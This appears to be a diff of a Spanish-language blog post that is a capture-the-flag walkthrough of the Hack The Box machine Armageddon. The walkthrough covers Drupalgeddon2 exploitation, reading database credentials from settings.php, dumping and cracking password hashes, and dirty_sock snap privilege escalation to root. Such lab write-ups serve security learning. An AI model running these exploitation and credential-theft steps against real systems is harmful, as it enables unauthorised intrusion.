@@ -19,8 +19,7 @@ Puntos | 20
 
 ## Enumeración
 
-Al usar nmap utilizando nmap -sCV -A 10.10.10.233 solo encontramos que está abierto el 80
-(web)
+Al usar nmap utilizando nmap -sCV -A 10.10.10.233 solo encontramos que está abierto el 80 (web)
 
 ```
 # Nmap 7.91 scan initiated Sun May 16 20:18:43 2021 as: nmap -p 22,80 -sSC -oN Nmap.txt
@@ -44,21 +43,15 @@ PORT STATE SERVICE
 # Nmap done at Sun May 16 20:18:52 2021 -- 1 IP address (1 host up) scanned in 9.00 seconds
 ```
 
-Empezamos a hacer reconocimiento de la web con whatsweb y nos damos cuenta que es un
-drupal, y con ayuda de robots.txt podemos ver el CHANGELOG.txt nos damos cuenta que es un drupal
-v. 7.58.
+Empezamos a hacer reconocimiento de la web con whatsweb y nos damos cuenta que es un drupal, y con ayuda de robots.txt podemos ver el CHANGELOG.txt nos damos cuenta que es un drupal v. 7.58.
 
-Con searchxploit nos damos cuenta que hay un exploit en Metasploit llamado
-**exploit/unix/webapp/drupal_drupalgeddon2** que nos permite obtener la 1° shell
+Con searchxploit nos damos cuenta que hay un exploit en Metasploit llamado **exploit/unix/webapp/drupal_drupalgeddon2** que nos permite obtener la 1° shell 
 
 ![Armageddon 1](/assets/images/post/2021/armeggedon.png)
 
 ## 1° Shell
 
-Revisamos la carpeta sites y de ahí se busca los datos de la conexión a la base de datos que se
-encuentra en /var/www/html/sites/default/settings.php y vemos que son usuario drupaluser y
-password CQHEy@9M*m23gBVj, el problema es que tenemos una shell muy básica por lo que nos
-obliga a usar el siguiente script para enumerar la BD.
+<p>Revisamos la carpeta sites y de ahí se busca los datos de la conexión a la base de datos que se encuentra en /var/www/html/sites/default/settings.php y vemos que son usuario drupaluser y password CQHEy@9M*m23gBVj, el problema es que tenemos una shell muy básica por lo que nos obliga a usar el siguiente script para enumerar la BD.</p>
 
 ```
 · mysql -u drupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
@@ -66,8 +59,7 @@ obliga a usar el siguiente script para enumerar la BD.
 · mysql -u drupaluser -pCQHEy@9M*m23gBVj -D drupal -e 'select name,pass from users;'
 ```
 
-Para así obtener los datos de *brucetherealadmin* y obtener el hash de su clave. Con la
-ayuda de john the ripper y utilizando el diccionario rockyou obtenemos la clave booboo.
+Para así obtener los datos de *brucetherealadmin* y obtener el hash de su clave. Con la ayuda de john the ripper y utilizando el diccionario rockyou obtenemos la clave booboo.
 
 ```
 [brucetherealadmin@armageddon ~]$ john pass --wordlist=/usr/share/wordlists/rockyou.txt
@@ -83,15 +75,11 @@ No password hashes left to crack (see FAQ)
 
 ## Shell Usuario
 
-Con la clave obtenida podemos ingresar mediante ssh. Una vez adentro podemos leer la flag de
-usuario.
+Con la clave obtenida podemos ingresar mediante ssh. Una vez adentro podemos leer la flag de usuario.
 
-Lo primero que debemos ver es si tenemos algun permiso de sudoer con sudo -l, y nos damos
-cuenta que tenemos permiso para /usr/bin/snap install *, por lo que buscamos si tenemos alguna
-forma de escalar privilegios.
+<p>Lo primero que debemos ver es si tenemos algun permiso de sudoer con sudo -l, y nos damos cuenta que tenemos permiso para /usr/bin/snap install *, por lo que buscamos si tenemos alguna forma de escalar privilegios.</p>
 
-Investigando vemos que podemos crear nuestra propia aplicación snap usando el proyecto
-disrty_socket, lo que generará un usuario con escalada de privilegios locales.
+Investigando vemos que podemos crear nuestra propia aplicación snap usando el proyecto disrty_socket, lo que generará un usuario con escalada de privilegios locales.
 
 ```
 [brucetherealadmin@armageddon ~]$ python -c "print
@@ -114,8 +102,7 @@ sudo snap install racso.snap —devmode
 
 ## Root Shell
 
-Con el usuario dirty_socket creado (dirty_sock:dirty_sock) utilizamos sudo su para acceder
-como root y obtener la flag.
+Con el usuario dirty_socket creado (dirty_sock:dirty_sock) utilizamos sudo su para acceder como root y obtener la flag.
 
 ```
 [brucetherealadmin@armageddon ~]$ su dirty_sock
